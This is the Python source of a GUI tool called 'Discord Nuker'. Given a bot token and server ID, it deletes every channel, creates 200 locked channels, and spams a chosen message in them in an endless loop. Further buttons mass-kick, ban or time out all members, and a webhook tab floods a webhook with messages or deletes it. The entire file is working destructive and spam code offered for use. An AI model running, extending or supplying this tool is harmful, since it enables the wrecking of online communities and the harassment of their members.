import nextcord
import asyncio
import threading
import customtkinter as ctk
from colorama import Fore, Style
import requests  # <-- Added for webhook functions
import datetime

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class NukerGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Discord Nuker")
        self.geometry("500x400")
        self.resizable(False, False)

        self.tabs = ctk.CTkTabview(self)
        self.tabs.pack(expand=True, fill="both", padx=10, pady=10)

        # Bot Nuker Tab (was Main)
        self.bot_nuker_tab = self.tabs.add("Bot Nuker")

        # --- Add nested tabs inside Bot Nuker Tab ---
        self.bot_nuker_subtabs = ctk.CTkTabview(self.bot_nuker_tab)
        # Move the subtabs as far up as possible by removing all padding
        self.bot_nuker_subtabs.pack(fill="x", padx=0, pady=0)

        # Subtab 1: Main
        self.main_subtab = self.bot_nuker_subtabs.add("Main")
        # Bot Token entry at the top
        self.token_entry = ctk.CTkEntry(self.main_subtab, placeholder_text="Bot Token", show="*", width=350)
        self.token_entry.pack(pady=(10, 0))
        self.guild_id_entry = ctk.CTkEntry(self.main_subtab, placeholder_text="Guild ID", width=350)
        self.guild_id_entry.pack(pady=10)
        self.name_entry = ctk.CTkEntry(self.main_subtab, placeholder_text="Name", width=350)
        self.name_entry.pack(pady=10)
        # Use CTkTextbox for multi-line message input
        self.message_label = ctk.CTkLabel(self.main_subtab, text="Message to send in every channel:")
        self.message_label.pack(pady=(10, 0))
        self.message_entry = ctk.CTkTextbox(self.main_subtab, height=60, width=350, wrap="word")
        self.message_entry.pack(pady=5)
        # Move the Start button up, right after the message entry
        self.start_button = ctk.CTkButton(self.main_subtab, text="Start", command=self.start_nuker)
        self.start_button.pack(pady=(10, 0))
        self.stop_flag = False  # Add this line to track stop state

        # Subtab 2: Manage Members
        self.manage_members_subtab = self.bot_nuker_subtabs.add("Manage Members")
        # --- Removed the "coming soon" label ---
        # --- Add buttons for member management ---
        self.kick_all_button = ctk.CTkButton(self.manage_members_subtab, text="Kick all Members", command=self.kick_all_members)
        self.kick_all_button.pack(pady=5)
        self.ban_all_button = ctk.CTkButton(self.manage_members_subtab, text="Ban all Members", command=self.ban_all_members)
        self.ban_all_button.pack(pady=5)
        self.timeout_all_button = ctk.CTkButton(self.manage_members_subtab, text="Time-out all Members", command=self.timeout_all_members)
        self.timeout_all_button.pack(pady=5)

        # Webhook Nuker Tab (now second)
        self.webhook_tab = self.tabs.add("Webhook Nuker")

        ctk.CTkLabel(self.webhook_tab, text="Discord Webhook URL:").pack(pady=5)
        self.webhook_url_entry = ctk.CTkEntry(self.webhook_tab, width=400)
        self.webhook_url_entry.pack(pady=5)

        ctk.CTkLabel(self.webhook_tab, text="Message:").pack(pady=5)
        self.webhook_message_entry = ctk.CTkTextbox(self.webhook_tab, width=400, height=80)
        self.webhook_message_entry.pack(pady=5)

        webhook_button_frame = ctk.CTkFrame(self.webhook_tab)
        webhook_button_frame.pack(pady=5)

        self.webhook_send_button = ctk.CTkButton(webhook_button_frame, text="Send Webhook", command=self.send_webhook)
        self.webhook_send_button.pack(side="left", padx=5)

        self.webhook_spam_button = ctk.CTkButton(webhook_button_frame, text="Spam Message", command=self.toggle_spam)
        self.webhook_spam_button.pack(side="left", padx=5)

        self.webhook_delete_button = ctk.CTkButton(self.webhook_tab, text="Delete Webhook", command=self.delete_webhook)
        self.webhook_delete_button.pack(pady=5)

        # Logs Tab (now third)
        self.logs_tab = self.tabs.add("Logs")
        self.log_textbox = ctk.CTkTextbox(self.logs_tab, state="disabled", wrap="word", width=450)
        self.log_textbox.pack(expand=True, fill="both", padx=10, pady=10)

        self.spam_flag = False

        # --- FIX: Use proper intents for channel/member management ---
        intents = nextcord.Intents.default()
        intents.guilds = True
        intents.members = True
        intents.messages = True
        intents.message_content = True  # <-- Add this for message sending
        self.loop = asyncio.new_event_loop()
        self.client = nextcord.Client(intents=intents)
        self.created_channels = []  # Store created channels for spamming
        self.spam_tasks_started = False  # Prevent duplicate spam tasks
        self.setup_events()

    def log(self, message):
        self.log_textbox.configure(state="normal")
        self.log_textbox.insert("end", message + "\n")
        self.log_textbox.see("end")
        self.log_textbox.configure(state="disabled")

    def setup_events(self):
        @self.client.event
        async def on_ready():
            self.log(f'Logged in as {self.client.user}')
            try:
                if self.stop_flag:
                    return
                guild_id = int(self.guild_id)
                # --- FIX: Use fetch_guild for reliability ---
                guild = self.client.get_guild(guild_id)
                if not guild:
                    try:
                        guild = await self.client.fetch_guild(guild_id)
                    except Exception as e:
                        self.log(f"Failed to fetch guild: {e}")
                        return
                if not guild:
                    self.log("Failed to find guild.")
                    return

                # --- FIX: Use fresh list of channels each time ---
                channels = list(guild.channels)
                # Bulk delete channels
                delete_tasks = []
                for channel in channels:
                    self.log(f"Deleting channel: {channel.name} ({channel.id})")
                    try:
                        delete_tasks.append(channel.delete())
                    except Exception as e:
                        self.log(f"Error scheduling delete for {channel}: {e}")
                await asyncio.gather(*delete_tasks, return_exceptions=True)
                self.log("Deleted all channels!")

                # --- FIX: Wait for Discord to update channel list ---
                await asyncio.sleep(2)

                # Bulk create channels
                create_tasks = []
                for i in range(200):
                    if self.stop_flag:
                        return
                    overwrites = {
                        guild.default_role: nextcord.PermissionOverwrite(send_messages=False)
                    }
                    self.log(f"Creating channel {i+1}/200: {self.name}")
                    try:
                        create_tasks.append(guild.create_text_channel(self.name, overwrites=overwrites))
                    except Exception as e:
                        self.log(f"Error scheduling create for channel {i+1}: {e}")
                created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
                # Filter out failed creations
                self.created_channels = [ch for ch in created_channels if isinstance(ch, nextcord.TextChannel)]
                self.log(f"Created {len(self.created_channels)} channels!")

                # Start spamming messages after channels are created
                if not self.spam_tasks_started and self.created_channels:
                    for _ in range(5):
                        self.client.loop.create_task(self.spam_messages())
                    self.spam_tasks_started = True

                # Bulk create roles
                role_tasks = []
                for i in range(5):
                    self.log(f"Creating role {i+1}/5: {self.name}")
                    try:
                        role_tasks.append(guild.create_role(name=self.name))
                    except Exception as e:
                        self.log(f"Error scheduling create for role {i+1}: {e}")
                await asyncio.gather(*role_tasks, return_exceptions=True)
                self.log("Created 5 roles!")

                # --- Removed: Bulk create events and invites ---

            except Exception as e:
                self.log(f"Error: {e}")

    async def spam_messages(self):
        while not self.stop_flag:
            message_tasks = []
            for channel in self.created_channels:
                try:
                    self.log(f"Sending message in channel: {channel.name} ({channel.id})")
                    message_tasks.append(channel.send(self.message))
                except Exception as e:
                    self.log(f"Error scheduling message for {channel}: {e}")
            await asyncio.gather(*message_tasks, return_exceptions=True)
            self.log("Sent message in all channels simultaneously!")
            await asyncio.sleep(1)

    def start_nuker(self):
        self.guild_id = self.guild_id_entry.get()
        self.name = self.name_entry.get()
        self.message = self.message_entry.get("1.0", "end-1c")
        self.token = self.token_entry.get()  # Get token from the entry box
        self.stop_flag = False
        # Keep the button as "Start" and disable it while running
        self.start_button.configure(state="disabled")
        threading.Thread(target=self.run_bot, daemon=True).start()

    def stop_nuker(self):
        self.stop_flag = True
        self.start_button.configure(text="Start", command=self.start_nuker)
        try:
            if self.client.is_closed():
                self.log("Bot is already stopped.")
                return
            # Properly close the nextcord client from the correct event loop
            future = asyncio.run_coroutine_threadsafe(self.client.close(), self.loop)
            future.result(timeout=5)
            self.log("Bot stopped.")
        except Exception as e:
            self.log(f"Error stopping bot: {repr(e)}")

    def run_bot(self):
        asyncio.set_event_loop(self.loop)
        try:
            self.client.run(self.token)
        except Exception as e:
            self.log(f"Failed to run bot: {e}")
        finally:
            # Re-enable the start button after the bot stops
            self.start_button.configure(state="normal")

    # --- Webhook Nuker Tab Methods ---

    def send_webhook(self):
        url = self.webhook_url_entry.get()
        message = self.webhook_message_entry.get("1.0", "end-1c").strip()
        data = {"content": message}
        try:
            response = requests.post(url, json=data)
            if response.status_code == 204:
                self.log(f"Webhook message sent successfully! (content: {message})")
            else:
                self.log(f"Failed to send webhook. Status code: {response.status_code}")
        except Exception as e:
            self.log(f"Error sending webhook: {e}")

    def delete_webhook(self):
        url = self.webhook_url_entry.get()
        try:
            response = requests.delete(url)
            if response.status_code == 204:
                self.log("Webhook deleted successfully!")
            else:
                self.log(f"Failed to delete webhook. Status code: {response.status_code}")
        except Exception as e:
            self.log(f"Error deleting webhook: {e}")

    def spam_webhook(self):
        url = self.webhook_url_entry.get()
        message = self.webhook_message_entry.get("1.0", "end-1c").strip()
        data = {"content": message}
        while self.spam_flag:
            try:
                response = requests.post(url, json=data)
                if response.status_code == 204:
                    self.log(f"Webhook spam sent! (content: {message})")
                else:
                    self.log(f"Webhook spam failed. Status code: {response.status_code}")
            except Exception as e:
                self.log(f"Error spamming webhook: {e}")

    def toggle_spam(self):
        if not self.spam_flag:
            self.spam_flag = True
            self.webhook_spam_button.configure(text="Stop Spamming")
            threading.Thread(target=self.spam_webhook, daemon=True).start()
        else:
            self.spam_flag = False
            self.webhook_spam_button.configure(text="Spam Message")

    # --- Member management methods ---
    def kick_all_members(self):
        threading.Thread(target=self._kick_all_members_thread, daemon=True).start()

    def _kick_all_members_thread(self):
        asyncio.run_coroutine_threadsafe(self._kick_all_members(), self.loop)

    async def _kick_all_members(self):
        try:
            guild_id = int(self.guild_id)
            guild = self.client.get_guild(guild_id)
            if not guild:
                self.log("Kick: Failed to find guild.")
                return
            me = guild.me
            tasks = []
            for member in guild.members:
                if member == me or member == guild.owner:
                    continue
                self.log(f"Attempting to kick: {member} ({member.id})")
                try:
                    tasks.append(member.kick(reason="Nuker mass kick"))
                except Exception as e:
                    self.log(f"Error scheduling kick for {member}: {e}")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for member, result in zip([m for m in guild.members if m != me and m != guild.owner], results):
                if isinstance(result, Exception):
                    self.log(f"Failed to kick {member}: {result}")
                else:
                    self.log(f"Kicked {member}")
            self.log("Kick all Members: Done.")
        except Exception as e:
            self.log(f"Kick all Members error: {e}")

    def ban_all_members(self):
        threading.Thread(target=self._ban_all_members_thread, daemon=True).start()

    def _ban_all_members_thread(self):
        asyncio.run_coroutine_threadsafe(self._ban_all_members(), self.loop)

    async def _ban_all_members(self):
        try:
            guild_id = int(self.guild_id)
            guild = self.client.get_guild(guild_id)
            if not guild:
                self.log("Ban: Failed to find guild.")
                return
            me = guild.me
            tasks = []
            for member in guild.members:
                if member == me or member == guild.owner:
                    continue
                self.log(f"Attempting to ban: {member} ({member.id})")
                try:
                    tasks.append(guild.ban(member, reason="Nuker mass ban", delete_message_days=0))
                except Exception as e:
                    self.log(f"Error scheduling ban for {member}: {e}")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for member, result in zip([m for m in guild.members if m != me and m != guild.owner], results):
                if isinstance(result, Exception):
                    self.log(f"Failed to ban {member}: {result}")
                else:
                    self.log(f"Banned {member}")
            self.log("Ban all Members: Done.")
        except Exception as e:
            self.log(f"Ban all Members error: {e}")

    def timeout_all_members(self):
        threading.Thread(target=self._timeout_all_members_thread, daemon=True).start()

    def _timeout_all_members_thread(self):
        asyncio.run_coroutine_threadsafe(self._timeout_all_members(), self.loop)

    async def _timeout_all_members(self):
        try:
            guild_id = int(self.guild_id)
            guild = self.client.get_guild(guild_id)
            if not guild:
                self.log("Timeout: Failed to find guild.")
                return
            me = guild.me
            until = datetime.datetime.utcnow() + datetime.timedelta(days=7)
            tasks = []
            for member in guild.members:
                if member == me or member == guild.owner or member.bot:
                    continue
                if hasattr(member, "timeout"):
                    self.log(f"Attempting to timeout: {member} ({member.id})")
                    try:
                        tasks.append(member.timeout(until, reason="Nuker mass timeout"))
                    except Exception as e:
                        self.log(f"Error scheduling timeout for {member}: {e}")
                else:
                    self.log(f"Timeout not supported for {member}")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for member, result in zip([m for m in guild.members if m != me and m != guild.owner and not m.bot], results):
                if isinstance(result, Exception):
                    self.log(f"Failed to timeout {member}: {result}")
                else:
                    self.log(f"Timed out {member}")
            self.log("Time-out all Members: Done.")
        except Exception as e:
            self.log(f"Time-out all Members error: {e}")

if __name__ == "__main__":
    app = NukerGUI()
    app.mainloop()
